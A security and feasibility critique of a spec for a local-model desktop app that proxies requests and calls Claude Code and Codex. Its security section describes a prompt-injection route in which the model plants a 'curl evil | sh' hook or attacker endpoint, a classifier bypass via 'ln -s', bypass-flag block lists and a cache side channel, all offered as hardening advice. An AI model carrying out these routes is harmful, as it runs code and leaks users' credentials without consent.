# 0.0.5: critiques of spec revision 1

Three independent critics read revision 1 of spec.md. Revision 2 adopts their changes (spec.md Part 5).


## Security: the WP5 proxy, the WP6 outside-agent tool, the classifier fix, the WP1

### [blocker] WP6 Build, templates (spec.md:430-435), and Part 1 rule "Nothing the model outputs may change ... tool switches"

**Problem.** The fixed templates do not stop Claude Code from running code and settings that the local model can plant. Folder-level hooks and servers are skipped only 'if the program offers a way'. The spec also keeps stored logins and strips API keys, which rules out --bare. So a builder can ship templates that load project settings. Separately, 'read-only by default' does not hold unless the template sets the permission mode and the tool list explicitly.

**Evidence** (verified). Verified in the official docs and the code. (1) code.claude.com/docs/en/permissions, section 'What runs before you trust a folder': for `claude -p` in a folder never trusted, these are 'Used': 'Hooks in settings files, the env block and helper commands such as apiKeyHelper, and a project skill's hooks and allowed-tools'. `.mcp.json` servers are 'Connected without asking'. (2) The app's own write rules do not cover these files: SENSITIVE_DIRS is only .git, .ssh, .gnupg, launchagents and launchdaemons (crates/policy/src/files.rs:40; same list at allow_all.rs:1207). So in Allow all, write_file to `<folder>/.claude/settings.json`, `.mcp.json`, `~/.claude/settings.json` or `~/.codex/config.toml` runs with no card. (3) Precedence, from the permission-modes docs: `permissions.defaultMode` from a settings file applies when no `--permission-mode` is passed (bypassPermissions from the user file; acceptEdits even from a project file). Plan mode runs 'classifier-approved commands when auto mode is available', so plan mode is not read-only. (4) Documented ways to close this exist (CLI reference): `--setting-sources user`, `--strict-mcp-config`, `--safe-mode` (turns off CLAUDE.md, skills, hooks and MCP; login and permissions still work) and `--restricted` (removes the command tools and WebFetch, keeps file tools inside the working directories, loads only managed settings and `--settings`, refuses bypassPermissions; v2.1.248 or later). For Codex: project hooks load only when the project is trusted, `[features] hooks = false` turns them off, and `--dangerously-bypass-hook-trust` exists (learn.chatgpt.com/docs/hooks). Scenario: a chat in Allow all, with Terminal off and Coding apps on. An injected web page makes the model write a SessionStart hook (`curl evil | sh`) or `env: {ANTHROPIC_BASE_URL: https://attacker}` into `.claude/settings.json` in the working folder. The model then asks ask_claude_code to 'Summarise README'. The card is harmless and the user clicks Allow once. Claude Code then runs the hook, or sends the user's login token to the attacker. That is code execution with the terminal switched off, and it gets past the card the user approved.

**Proposed change.** Put exact templates in the spec instead of 'if the program offers a way'. Claude Code, read-only: `claude -p --restricted --safe-mode --strict-mcp-config --permission-mode default --tools Read,Grep,Glob --settings '{"disableAllHooks":true,"permissions":{"blockReadsOutsideWorkingDirectories":true}}' --output-format stream-json -- <task>`. With may_edit: add Edit,Write to --tools and use `--permission-mode acceptEdits`. Codex: `codex exec --json --sandbox read-only|workspace-write -c features.hooks=false -- <task>`. The tool is not offered when `--help` or a version check shows a flag is missing. A test lists the forbidden flags (`--dangerously-skip-permissions`, `--allow-dangerously-skip-permissions`, `bypassPermissions`, `--dangerously-bypass-approvals-and-sandbox`, `--yolo`, `--full-auto`, `danger-full-access`, `--dangerously-bypass-hook-trust`) and asserts that each required flag is present. Add to WP6's owned files crates/policy/src/files.rs and the sensitive_place list in allow_all.rs. Writes to `.claude/`, `.mcp.json`, `.codex/`, `~/.claude/`, `~/.claude.json` and `~/.codex/` then keep asking, the same rule as `.git`. Tests both ways.

### [major] WP6 Build, the card (spec.md:426-429) and may_edit (433-434)

**Problem.** The card shows 'the folder' and 'whether it may change files', which implies the outside app works only inside that folder. As specified, it does not. Codex workspace-write can also write to /tmp and run commands inside its sandbox. Codex's read-only mode is documented only as 'typically' limited to the workspace. Claude Code without --restricted runs its built-in read-only shell commands. So a user approves a card whose stated limits are not the real ones, and files outside the folder (~/.ssh, ~/.aws, other projects) can be read and sent to the vendor.

**Evidence** (verified). learn.chatgpt.com/docs/agent-approvals-security: 'The workspace includes the current directory and temporary directories like /tmp'; the sandbox 'limits what it can touch (typically to the current workspace)'; read-only mode 'can read files and run commands within the read-only sandbox'. code.claude.com/docs/en/security: in Manual mode the file tools ask before reading outside the folder, but Claude Code 'runs a built-in set of read-only commands such as ls, cat, and git status without asking'. On the app side, approved folders can never contain the app's own data (src-tauri/src/permissions.rs:104-145), so the working folder never holds the chat database. That is the part that is sound.

**Proposed change.** Require the card to state, for each app, only what a contract test has shown the template confines. Claude Code with --restricted: 'reads and changes files only in <folder>'. Codex: 'It can read files elsewhere on this computer that you can read' unless a test proves otherwise. With may_edit: 'It can also change files in the temporary folder and run commands in its sandbox.' On Windows, say that Codex's sandbox has not been tried there. Add a test in which a fake program records its arguments, and a test that compares the card text with the template.

### [major] WP6 Build, program detection (spec.md:425-426) and the e2e scenario (442-445)

**Problem.** The program that runs is whatever resolves first on PATH, and the spec does not say whether detection executes it. If the user approved a folder that holds a PATH entry, for example their home folder with ~/.local/bin or ~/bin on PATH, the model can write a fake `claude` there. In Allow all that write has no card. Detection, or any approved ask_claude_code call shown as 'Claude Code', then runs the model's script with the user's rights, even with Terminal off. On Windows, `claude` and `codex` installed with npm resolve to `.cmd` shims. cmd.exe then parses the task, so 'never parsed by a shell' is false. Rust's batch quoting also refuses a task that contains a newline.

**Evidence** (verified). spawn.rs:725-751: `resolve_program` searches every absolute PATH entry and adds PATHEXT on Windows ('so npx resolves to npx.cmd'). It skips only relative entries and the current folder. files.rs:9-40: `.local/bin` and `bin` are not sensitive. permissions.rs:152 allows approving the home folder after a warning. The e2e plan itself relies on 'a fake claude ... placed first on PATH'.

**Proposed change.** Resolve each program once, when the user turns the Coding apps group on. Show the absolute, symlink-resolved path in the Tools panel and on every card. Refuse a program whose resolved path is inside any approved folder. Before spawning, check again that the file's identity (device, inode or file id, size, mtime) has not changed since the switch was turned on. Detect by locating the file only, never by executing it, or run it only on the user's click. On Windows, run the real `.exe`, or `node <package>/cli.js` read from the shim. Never run a `.cmd`, `.bat` or `.ps1`. Tests: a program inside an approved folder is refused; a swapped file is refused; a multi-line task reaches the fake program on Windows as one argument.

### [major] WP6 Build, classifier fix (spec.md:421-423)

**Problem.** Matching on the program name alone is easy to get around after untrusted content enters the turn. The map's rule that bypass flags keep asking (map.md:416, map-details 'treat their bypass flags as keep-asking') was dropped from the spec. 'Others ... the builder confirms' is open-ended. Ask first is not covered, so the raw terminal route still allows a chat-wide grant, against D11.

**Evidence** (verified). Verified by reading the code. `program_name` is basename plus extension stripping on the literal word, with no symlink resolution (crates/policy/src/command.rs:392-404). `ln` is in no list. So `ln -s /usr/local/bin/claude h` followed by `./h -p "..." --dangerously-skip-permissions` parses as plain, gets network=false and no keep_asking, and runs as AllowedByMode (engine.rs:255-268). Package runners are deliberately not wrappers (allow_all.rs:73-75), so `npx @openai/codex exec ...`, `bunx` and `pnpm dlx` are read as ordinary arguments. NETWORK_PROGRAMS has no coding apps (allow_all.rs:119-157).

**Proposed change.** Specify the rule in full. The line asks (KeepAsking::Hidden plus network) when: (a) the program position, after wrappers, names one of a fixed list (claude, claude-code, codex, gemini, qwen, aider, opencode, cursor-agent, goose, amp, crush, copilot, q, plus .exe and .cmd forms); (b) such a name is the package argument of npx, npm exec, pnpm dlx, yarn dlx, bunx, uvx or pipx run; (c) node or bun is handed a script whose path contains `@anthropic-ai/claude-code` or `@openai/codex`; (d) one of the bypass tokens from the blocker appears anywhere on the line, whatever the program. In Ask first, mark such lines Risk::AlwaysAsk (Allow once only). In the 13.3 limits, state that a copied or wrapped binary is still not seen. Add a table test for each row and for the `ln -s` rename.

### [major] WP5 Build, proxy forwarding (spec.md:382-389)

**Problem.** The proxy forwards request bodies and streams responses back unchanged. Two problems follow. First, an http(s) image URL in a forwarded body makes llama-server fetch that address itself whenever a vision model is loaded, even with --offline. The proxy can then do something besides generate text: reach LAN or cloud-metadata addresses and send a signal out from the user's machine. Second, the response fields `timings.cache_n`, `prompt_tokens_details.cached_tokens` and `cache_read_input_tokens` tell any key holder how many of its prompt tokens match the in-app chat's last request, which leaks chat content one guess at a time. The spec also does not say which headers are forwarded, that the upstream client must not use a system proxy, or in which order checks run.

**Evidence** (verified). ARCHITECTURE.md:349: 'The app never forwards an http(s) or file: image URL, because the server would fetch it itself even with --offline'. The app's own guard is `validate_media` (crates/agent/src/types.rs:472-473), which a raw proxy bypasses. Probed on the pinned b12110 with the app's flags. After the private request 'My bank PIN is 4831 and my mother is called Ingrid...', a probe 'My bank PIN is 48' returned cache_n=24, a probe '...is 5' returned 22, and the full prefix returned 31. With no projector loaded, an image URL is refused ('image input is not supported'), so the fetch needs a vision model; that part is inferred from ARCHITECTURE 7.3, not run. The app's loopback client turns off proxies (`config.loopback = true`, runtime_manager.rs:799-806); a new hyper client does not do that by default.

**Proposed change.** Make the proxy parse and rebuild requests instead of passing them through. Match the five paths exactly and send a constant upstream path, dropping the query. Check Host, Origin and the key (constant-time compare) before reading the body or revealing whether a model is loaded. Run `validate_media` on all three API shapes and refuse any image or file reference that is not a data: URL. Keep only fields known to the API (drop llama.cpp extras such as grammar, n_probs, id_slot, lora, cache_prompt) and cap max_tokens. Forward a fixed header list through a client with no proxy and no redirects. Remove `timings` and the cached-token counters from JSON and SSE responses. State in SECURITY.md that a timing channel remains. Tests: a URL image is refused for messages, chat/completions and responses; no cache counter appears in a response; a path with `..` or percent-encoding is refused.

### [major] WP5 Build, stable port and setup cards (spec.md:378-380, 398-405)

**Problem.** The proxy's port is fixed and known, but the outside apps' settings outlive it. When harnessUI is closed or sharing is off, any local program or another user account can listen on that port. Claude Code and Codex, still pointed there, then send it the sharing key and their full prompts, including repository code. The spec handles only the case where the port is taken when sharing is switched on. The recommended 'env block of its settings file' sends every Claude Code session to the proxy. It also breaks WP6: with `--setting-sources user`, ask_claude_code would send the task to the local model while the card says 'sent to Anthropic'.

**Evidence** (inferred). spec.md:379 'default port fixed by the builder' (a number in public source); 404-405 handles only a conflict at switch-on. map.md:252 claims the proxy 'avoids handing out a port the app does not control', which is true only while the app is running. A Claude Code env block in ~/.claude/settings.json applies to all sessions (map-details item 3, official docs). 127.0.0.1 ports are open to every local account (map-details 'VERIFIED (read): ... under any user').

**Proposed change.** Pick the default port at random from a high range on first switch-on and keep it, so it is not a published constant. Setup cards should recommend configuration scoped to one session: shell variables for one terminal, or a separate settings file passed with `claude --settings <file>` or a Codex profile. Do not recommend the global env block. Each card should say in one line: 'While harnessUI is closed or sharing is off, another program on this computer could pretend to be harnessUI on this port and receive what this app sends, including the key.' WP6 refuses, or says so on the card, when the app's environment or user settings point ANTHROPIC_BASE_URL or a Codex provider at the sharing port.

### [major] WP5 Build, audit (spec.md:390-392)

**Problem.** 'One audit row per request' does not exclude refused requests. The audit table is append-only and has no retention. If refused requests are recorded, any local program can fill the database with rows that can never be deleted. So can a web page in browsers that allow no-cors POSTs to loopback: the Origin rule refuses them, but each would still write a row. The calling program's name comes from User-Agent, which is self-reported and can be forged.

**Evidence** (verified). crates/store/src/schema.rs:126-168: audit_log has BEFORE DELETE and BEFORE UPDATE triggers that RAISE 'append-only'. A grep for retention, prune or vacuum in crates/store and src-tauri finds nothing.

**Proposed change.** Write audit rows only for requests that passed the Host, Origin and key checks. Count refused requests in memory and show them in the Other apps tab ('N requests were refused since sharing was turned on'). Limit refused attempts to a small number per second. Show the program name as 'says it is <name>', after the existing one-line sanitiser, at most 40 characters. Add a test: 10,000 requests without a key write no audit rows.

### [major] WP6 Owns (spec.md:415-419) and 'Not available to helpers' (438); D11

**Problem.** Two requirements cannot be built safely within WP6's file ownership. First, keeping the tools from run_subagent helpers needs the helper filter in src-tauri/src/turns.rs, which WP6 does not own and which is not a shared file. Second, D11 relies on the policy engine, but in Allow all the engine never looks at Risk::AlwaysAsk. A describer that sets only risk=AlwaysAsk therefore runs with no card in Allow all.

**Evidence** (verified). src-tauri/src/turns.rs:750-768 builds the helper's `enabled` and `hidden` lists by filtering only `subagent::is_tool`. crates/policy/src/engine.rs:255-268: the Allow all branch returns AllowedByMode before step 3 (`risk == AlwaysAsk`, :270-275) unless `keep_asking` is set, or `network` is set and the turn is untrusted.

**Proposed change.** Give WP6 the two filter lines in turns.rs, or have WP0 add a shared `offered_to_helpers(&RegisteredTool)` predicate that WP6 fills in. State that the action sets risk=AlwaysAsk, keep_asking=Some(..), network=true and outbound=true. Better: change the engine so that AlwaysAsk also asks in Allow all, with a test. Tests: a helper's tool list does not contain ask_claude_code; in Allow all, with and without untrusted content, the decision is Ask with a OnceOnly card.

### [minor] WP6 Build, 'the task is one argument' (spec.md:431)

**Problem.** One argument can still be read as an option. A task that begins with '-' (for example `--settings={...}` or `--permission-mode=...`) is parsed as a flag by both command-line parsers. Today that mostly ends in 'no prompt', but whether a startup hook fires before that error is not known. The planned test ('no bypass flag can ever appear') passes even while this argv shape exists.

**Evidence** (inferred). Inferred from standard commander and clap parsing. The templates in map-details item 3 put the task last with no `--`. The Windows `.cmd` part is in the program-resolution issue above.

**Proposed change.** Always put `--` before the task, or pass the task on stdin. Refuse an empty task or one that begins with '-'. Add a test with task "--dangerously-skip-permissions" that checks the fake program receives it after `--`.

### [minor] WP5 alias (spec.md:373-376) and setup text (398-403)

**Problem.** The fallback 'the proxy answers /v1/models itself and strips paths' still leaks the full model path. Every generation response carries it, and the spec says responses stream through unchanged. The short name is not defined. If it comes from the file name, a comma splits it into several aliases, and quotes or newlines can inject into the copy-ready Codex TOML or Claude JSON. A Codex `[mcp_servers.x] command=` block injected that way runs when Codex starts.

**Evidence** (verified). Probed on b12110 without an alias: the `model` field of /v1/chat/completions, /v1/messages and /v1/responses was '/home/user/llama-dev/Qwen3-0.6B-Q8_0.gguf'. With `-a local`: the JSON and SSE `model` fields and /v1/models said 'local', while /props `model_path` kept the real path, so the start-up identity check (server.rs:357) is unaffected. The help text says '-a, --alias STRING  set model name aliases, comma-separated'.

**Proposed change.** Make `-a <fixed constant>` (for example `harnessui-local`) required in WP1's launch, and remove the fallback. Never derive the public name from a file name. Build the setup snippets with a TOML or JSON serializer. Test that no response body, in any API shape or over SSE, contains the model path.

### [minor] WP4a compare_facts / D6 (spec.md:126-131, 338-342), WP4b rows (356-362)

**Problem.** The spec never says how a model is matched to a catalog entry. If WP4a matches by `base_model`, repo name or tags, any uploader who claims a catalog model's base gets the curated text labelled 'The publisher says', plus its capabilities. Uploader text and the Hugging Face licence link are uploader-controlled, but the spec gives no rendering rules for them, unlike the model card (ARCHITECTURE 11) and links in model output (13.2).

**Evidence** (verified). Catalog entries carry repo, revision, path and sha256 (catalog/models.json, for example unsloth/Qwen3.5-4B-GGUF). Today `catalog_id` is set only by `download_catalog_entry` (hub.rs:544-552). The opener allows any http(s) URL (capabilities/main.json:25, `opener:allow-default-urls`); only Markdown links go through the confirm step.

**Proposed change.** Attach catalog facts only on an exact sha256 match, or on repo+revision+path. Never match by base_model, name or tags. Show uploader text as plain text through the card sanitiser (bidi and zero-width characters made visible), capped at 300 characters. Drop unknown tags. Open the licence link only through the same destination-confirm dialog as links in model output. Add tests for a spoofed base_model and for a link with a right-to-left override.

### [minor] WP6 Build, Stop (spec.md:436-437)

**Problem.** 'Stop kills the process tree' claims more than spawn.rs does on Unix. It signals the process group. A process that Claude Code or Codex starts in its own session (setsid, or detached Node children) outlives Stop. ARCHITECTURE 13.14 already admits this for benchmarks.

**Evidence** (verified). spawn.rs:12-15, 322-330: Unix children lead a process group, and kill signals that group. Windows uses a job object with KILL_ON_JOB_CLOSE, which does cover the whole tree.

**Proposed change.** Reword to 'Stop ends the process group (Unix) or job (Windows)'. Add the same known limit as 13.14. Remove 'kills the process tree' from the tests and the report.


**Checked and sound:**
- llama-server's environment is an allow-list (spawn.rs:17-19 env_clear, launch.rs:162-177 build_env_on): LLAMA_ARG_*, GGML_* and HF_* from the app's environment cannot reach it. The new load settings are typed values passed as single argv items, and the device string is only ever the value after --device.
- D4's rules (no free-text arguments, no file paths, a fixed list for reasoning budget) and keeping --offline, --no-slots, --cors-origins none and -np 1 close the dangerous llama-server flags. POST /props needs --props, which is never passed.
- -a/--alias works on b12110 (checked live): API model ids become the alias while /props model_path stays the real path, so the start-up identity check survives.
- The proxy's Host check (127.0.0.1:port or localhost:port only) plus refusing any Origin header and requiring the key in a custom header blocks web pages and DNS rebinding. A no-cors GET cannot carry x-api-key or Authorization.
- The set_setting allow-list stays unchanged (models_cmd.rs:193-198), and every new command follows the only_main_window(window.label()) pattern used in mentions.rs, pinned.rs and evals/commands.rs. No tool can reach the share, model-settings or reload commands.
- Every executed tool result marks the turn untrusted (crates/agent/src/turn/runner.rs:1608), so WP6 output automatically triggers D9 for later outbound actions.
- resolve_program never searches the current folder or relative PATH entries (spawn.rs:725-760), so a program planted in a cloned repository cannot shadow claude or codex unless an approved folder is itself on PATH (see the program-resolution issue).
- Approved folders can never contain or sit inside the app's own data, log or install folders (permissions.rs:104-145), so the outside agent's working folder never holds the chat database or audit log.
- The evals gate refuses anything that keeps asking, so the coding-app tools cannot run inside a model check or benchmark.
- The catalog plan (optional fields, schemaVersion 1, sequence 2, signed by the release workflow) keeps older parsers working and needs no new trust anchor.
- D11's design (a card every time, Allow once only, the app named, data-leaves-the-computer wording) and D9's reuse of existing audit decision values are sound in principle, given the engine and ownership fix above.


## Can it be built as written, in this code, without breaking what works: package b

### [blocker] D4 'How long it may think'; WP1 Build (new launch fields); WP3 Owns (turn/runner.rs)

**Problem.** The thinking limit is planned as the llama-server flag `--reasoning-budget`. But the agent loop already sends `reasoning_budget_tokens` with every llama-server request, and that per-request value overrides the flag. Scenario: the user picks Short for a thinking model and every in-app reply still thinks up to half the output allowance. The control does nothing in the app and only changes requests that come in through the WP5 proxy. No package is told to change runner.rs for this.

**Evidence** (verified). crates/agent/src/turn/runner.rs:670-686 (`limit_thinking`) sets `reasoning_budget_tokens = max(max_tokens/2, 128)` whenever thinking is on and the endpoint is llama-server. I ran the pinned b12110 with `--reasoning-budget 0` and sent the same chat request twice. Without the field the reply had 0 characters of `reasoning_content`; with `"reasoning_budget_tokens":200` it had 563. The per-request value wins.

**Proposed change.** Make the thinking limit a per-request value. Add the resolved `ThinkingLimit` to `TurnInput`/`RequestTemplate`, filled from the resolved per-model settings where chat.rs/turns.rs build the turn. Have `limit_thinking` send min(choice, max_tokens/2). Give the runner.rs part to WP3 and the plumbing to WP1. Remove `--reasoning-budget` from the launch arguments, or keep it only as the default for outside-app requests and say so in the UI.

### [major] Storage (`localModel`, `modelLoad:`); Shared contracts (ContextChoice, ModelLoadSettings); WP0 'nothing else changes behaviour'

**Problem.** `LocalModelSettings` is two things at once: the stored defaults and the per-load input that the runtime compares and launches with. If `ctx: u32` becomes a `ContextChoice` enum, WP0 has to rewrite every consumer, which changes behaviour; otherwise the tree stops compiling. Reading saved data across versions also fails: a 0.0.4 build that meets `"ctx":"auto"` silently resets all local settings, the saved backend included. Using 0 as the Automatic marker is no better, because 0.0.4 rejects ctx 0 at launch. Per-model overrides ('every field optional, None = follow defaults') clash with `device`, where None already means Auto, so serde cannot tell 'follow default' apart from 'Auto'.

**Evidence** (verified). dto.rs:176-199 (`ctx: u32`; `device` None = Auto). Consumers of `.ctx`: runtime_manager.rs:347,400 (LaunchConfig.ctx); load_tracker.rs:23,50,60 (whole-struct compare); models_cmd.rs:59-80 (cap and no-op check) and :110 (validation); hub.rs:285; mcp_cmd.rs:983 and its test at :1362; load_tracker.rs:134 tests; SettingsDialog.tsx:436-437 (`Number(e.target.value)`). settings.rs:58-67 falls back to Default on any parse error. server.rs validate rejects `ctx == 0` (test at server.rs:719).

**Proposed change.** Leave `ctx: u32` as it is and add `#[serde(default)] context_auto: bool`, or an optional `context` field, next to it. The resolver returns a separate `ResolvedLoad { ctx: u32, gpu, kv, load_mode, thinking, backend, device, mmproj }`, which RuntimeManager::load, LoadTracker and the no-op check use. In `ModelLoadSettings`, use explicit enums such as `DeviceChoice::{Default, Auto, Named}` instead of Option<Option<_>>. Define 'both ways' as two tests: 0.0.4 JSON read by 0.0.5, and 0.0.5 JSON read by the 0.0.4 struct.

### [major] Part 4 Order; Shared contracts (WP0)

**Problem.** Several packages that are meant to run in parallel depend on each other's unfinished work. (1) `FitInput` is built field by field in hub.rs (WP4a), while WP1 owns fit.rs and must add Save-memory and GPU-choice inputs. Any field WP1 adds breaks WP4a's file, and Part 1 forbids fixing someone else's file. `catalog_list` and `compare_facts` also need WP1's new fit. (2) WP2's e2e step ('Settings changed…', Apply and restart) needs a loaded local model and WP1's working commands, but WP0's stubs return 'not built yet'. scripted_agent.py never loads a local model, so the step cannot run there at all. (3) WP2 imports WP4b's 'Add to comparison' hook, which does not exist until WP4b writes it. (4) WP5 needs WP1's alias field, `set_model_load_settings` (for the 32k button) and the busy query, and WP2's header for 'Used by another app'.

**Evidence** (verified). hub.rs:307-313 (FitInput literal); fit.rs:54-66. Spec WP2 e2e, WP4b ('using the exported hook/store from this package') and WP5 ('coordinated with WP1'). scripted_agent.py:1-10 (fake remote endpoint only; LLAMA_DIR is only passed in the environment at :2816).

**Proposed change.** Have WP0 also freeze four things. (a) The fit API: give `FitInput` a Default, switch hub.rs to `..Default::default()`, and let WP1 add fields and functions but never change existing signatures. (b) A `src/store/compare.ts` stub with the hook's signature. (c) The `alias` field in LaunchConfig and an 'other apps in flight' counter in AppState. (d) Stubs that return fixed sample data instead of errors. In Part 4, list WP2's e2e, WP5's 32k button and WP4a's fit columns as 'after WP1 is integrated'.

### [major] Part 3 Owns lists (WP1, WP2, WP3, WP5, WP6)

**Problem.** Some code that must change has no owner, so each of these requirements will either be skipped or edited by someone who does not own the file. WP6's 'off in new chats': any group not in PER_CHAT_ONLY is switched on in every new chat from the saved last choice. So after one use, Coding apps is on in every new chat. Every call still asks first (D11), so this breaks the 'off in new chats' rule but does not skip a card. WP6's 'not available to helpers' requires editing subagent.rs. WP1's new public types and the fit_params module need re-export lines in crate files nobody owns. WP3's document cap needs the chat's context at send time, and the summary fold needs turns.rs history assembly; WP3 owns neither. 'Load with settings…' and the settings entry for files opened with 'Open a GGUF file…' belong in ModelPicker.tsx, which nobody owns. 'Used by another app' is assigned to neither WP2 nor WP5. The load function `use()` sits in the ModelsDialog shell, which after the split keeps 'only the shell and tabs'.

**Evidence** (verified). mcp_cmd.rs:49 (`PER_CHAT_ONLY`) and :141-143 (LastChoice). subagent.rs:211-252 (NoNesting filters only TOOL_NAME). crates/runtime/src/lib.rs:36 (re-exports); crates/runtime/src/llama/mod.rs. chat.rs:359-360 calls save_documents before the budget at chat.rs:462-487; documents are inlined into history in turns.rs:121-135. ModelPicker.tsx:13-80, mounted at ChatView.tsx:159-160. ModelsDialog.tsx:549-561.

**Proposed change.** Extend the owner lists. WP6: the PER_CHAT_ONLY line in mcp_cmd.rs, and NoNesting/InheritedGate in subagent.rs. WP1: the re-export lines in crates/runtime/src/lib.rs and llama/mod.rs. WP3: history loading and assembly in turns.rs, and the save_documents call in chat.rs's send path. WP2: ModelPicker.tsx, plus showing 'Used by another app' from a ShareStatus field that WP5 fills. WP0: move `use()` into Installed.tsx.

### [major] D7; WP2 ('Settings → Local models, renamed section', plain stage words); WP5 (new Settings tab); Shared files rule for e2e/scripted_agent.py

**Problem.** Existing e2e scripts and tests pin labels this release changes, and the shared-file rule stops the renaming package from fixing them. If the 'Local models' tab is renamed, five e2e lines in three scripts fail, and WP2 may only edit its own scenario in scripted_agent.py and owns neither m8 nor m9. Replacing the raw stage text breaks m1's 'Loading model' check. Changing the default ctx or its type breaks a Rust test in mcp_cmd.rs, where WP1 has only a one-line edit. The new 'Other apps' tab is missing from m8's list, so the offline check never opens it.

**Evidence** (verified). e2e/m8_offline.py:35 (exact match on the selected tab's text at :121-124); m9_model_check.py:120; scripted_agent.py:299 (settings-pages), :2540 and :2597 (capability-check probe); m1_chat.py:182 ('Loading model' must appear); Welcome.test.tsx:54 ('Ready on vulkan · Vulkan0 · 65,536 context', WP2-owned, fine); mcp_cmd.rs:1362 (`LocalModelSettings::default().ctx` as u32); load_tracker.rs:134.

**Proposed change.** State that the tab keeps the label 'Local models' and only the section heading becomes 'Defaults for all models'. Keep 'Loading model' at the start of the loading line. WP5 adds 'Other apps' to SETTINGS_PAGES in m8_offline.py. WP1 owns the mcp_cmd.rs test change. Add to D7: the package that renames a label updates every e2e line that pins it, shared files included, and lists those lines in its report.

### [major] D3; WP1 (`generation_busy`); WP5 ('the D3 question covers it')

**Problem.** The busy check only knows about chat turns. Capability checks, coding benchmarks and proxied requests use the model without registering anywhere. Scenario: 'Apply and restart' or Reload during a benchmark kills llama-server and the run is recorded as failed, with no question asked. 'Wait' (restart when the reply ends) has no owner and no mechanism; the frontend only sees `finished` for chats it is streaming.

**Evidence** (verified). state.generation start/finish is called only in chat.rs:538-557. Evals reach the model directly through state.runtime.endpoint() (evals/commands.rs:110, evals/profile.rs:135). The proxy (WP5) would do the same.

**Proposed change.** WP0 defines `generation_busy()` as returning `{chat_turns, model_checks, other_apps}`. WP1 adds one 'model in use' counter to AppState that chat turns, evals runs (a one-line edit in evals, given to WP1) and the WP5 proxy all increment. WP1 also implements Wait in the backend, as `reload_local_model(force, when_idle)`.

### [major] D2b Automatic; WP1 ('The already loaded check and same_in_progress compare every launch-relevant field'); ModelLoadInfo ('loaded copy uses older settings')

**Problem.** Automatic is worked out from live free memory, and the model's own memory use lowers that figure once it is loaded. Re-resolving Automatic for the loaded model therefore gives a smaller number than it was loaded with. Picking the loaded model again then restarts it (minutes on a processor), and the 'Settings changed. Restart the model to use them.' banner may never clear. Counting the loaded model's memory back in, as the spec asks, is an estimate and can still miss by one 1,024 step.

**Evidence** (inferred). hub.rs:121-123: detect() reads `system_memory().available_bytes` on every call. models_cmd.rs:71-80 compares the resolved ctx with the loaded n_ctx. fit.rs:110-122 rounds to multiples of 1024. I reasoned this from the code and did not run it.

**Proposed change.** Resolve Automatic once per load and record both the choice (Automatic) and the number chosen in the runtime status. The no-op check and the 'older settings' flag compare choices, not re-resolved numbers. Only Reload and Apply and restart work out Automatic again.

### [major] WP6 Build ('the task is one argument, never parsed by a shell')

**Problem.** On Windows this cannot be built as written. When `claude` or `codex` is installed with npm, it is a `.cmd` shim, which can only run inside cmd.exe. The project's own rule for shims refuses any argument containing a double quote, `%`, CR or LF. Scenario: a task written by the model almost always has a line break, so every such call either fails or tempts someone to loosen the quoting, which opens cmd.exe injection. This cannot be tested on this Linux machine.

**Evidence** (inferred). crates/mcp-host/src/winquote.rs:1-24 (cmd.exe /d /v:off /s /c; refuses " % CR LF NUL). That npm creates .cmd shims on Windows and that both programs read the prompt from stdin is from documentation; I did not run it.

**Proposed change.** Send the task on stdin (`codex exec -`; `claude -p` with the prompt piped in) and keep the command line to fixed template words. If the program is a .cmd/.bat, run it through winquote with fixed arguments only. Add a unit test that the task text never appears in argv on any platform.

### [major] WP2 words.ts ('a unit test that every backend kind and stage the backend can send has a phrase'); WP1 (messages in plain words)

**Problem.** The loading stage reaches the UI as free text. Part of it is llama.cpp's own stage names passed through unchanged, which is an open set; part is English sentences written in runtime_manager.rs. A TypeScript test cannot list every value, and WP2 cannot change the Rust sentences because WP1 owns that file. So 'no raw backend or stage names' cannot be guaranteed or tested.

**Evidence** (verified). protocol.rs:19-23 (stage names `text_model`, `spec_model`, `mmproj_model` from llama.cpp); runtime_manager.rs:559-561 (forwarded unchanged), :585 ('Restarting after a crash (n of m)') and :594-599 (step-down sentence); RuntimeIndicator.tsx:14 shows `stage.replace("_"," ")`.

**Proposed change.** WP0 adds a typed `LoadStage` enum to RuntimeStatusDto, with attempt numbers and from/to backend kinds where needed. WP1 maps llama.cpp's names to these codes, with unknown names becoming a generic 'Loading'. words.ts maps the codes to phrases, and the coverage test walks the enum exported in types.ts.

### [major] Part 3 package sizes; Part 4

**Problem.** WP1 is too large for one developer and every other package waits on it. It owns 13 files across three crates, six commands, the resolver, fit changes, step-down, contract tests against the real binary, and an e2e script, and WP2, WP4a and WP5 depend on it. WP3 spans the agent crate, store, app, frontend and an e2e. WP5 is an HTTP proxy with streaming and auth, plus keychain, audit, a settings page and setup text. WP4a mixes code with research for 14 catalog entries.

**Evidence** (inferred). Spec WP1 Owns list; Part 4 (WP2 'works against WP0's contract'; WP5 depends on WP1's launch field and command).

**Proposed change.** Split WP1 into WP1a, crates/runtime (launch.rs arguments, supervisor step-down, failure.rs, contract tests), and WP1b, src-tauri plus crates/models (resolver, commands, runtime_manager, load_tracker, fit and Automatic, e2e). Split WP3 into the agent crate and tests on one side, and app plus UI (turns.rs, the chat.rs DTO, ChatView divider, inspector, attachments) on the other. Split WP5 into the proxy core with contract tests, and the settings page, setup text and audit. Move WP4a's catalog content (reading publisher cards, fixing licences) into its own task.

### [minor] D2b ('an existing user's saved global size stays their default')

**Problem.** The decision assumes a stored ctx was chosen by the user. It often was not: changing only the Backend in Settings saves the whole settings object, ctx 8192 included. Those 0.0.4 users, possibly the owner after the Vulkan fix, will never get Automatic.

**Evidence** (verified). SettingsDialog.tsx:416-421: the backend onChange calls save({...settings, backend}). SettingsDialog.tsx:402-405 then calls setLocalModelSettings with the whole object, which models_cmd.rs:117 stores.

**Proposed change.** Decide this explicitly. Either treat a stored ctx of 8192 (the 0.0.4 default) as 'no choice' once on upgrade, or show a one-time line under Defaults for all models that offers Automatic.

### [minor] WP5 (alias launch field and its fallback)

**Problem.** The fallback is not needed, and it contradicts the spec. If the alias did not work, removing paths from responses would mean rewriting streamed bodies, which conflicts with 'streams responses through unchanged'. The alias does work in the pinned build.

**Evidence** (verified). Pinned b12110 run with `--alias short-name`: /props `model_path` stays the full path, so the identity check at server.rs:357 is unaffected. /v1/models gives id 'short-name', and chat completion responses carry `"model":"short-name"` even when the request names something else.

**Proposed change.** Make the alias required, with a fixed short value in the WP0 LaunchConfig contract, and remove the 'otherwise the proxy strips paths' branch.

### [minor] WP5 ('One audit row per request')

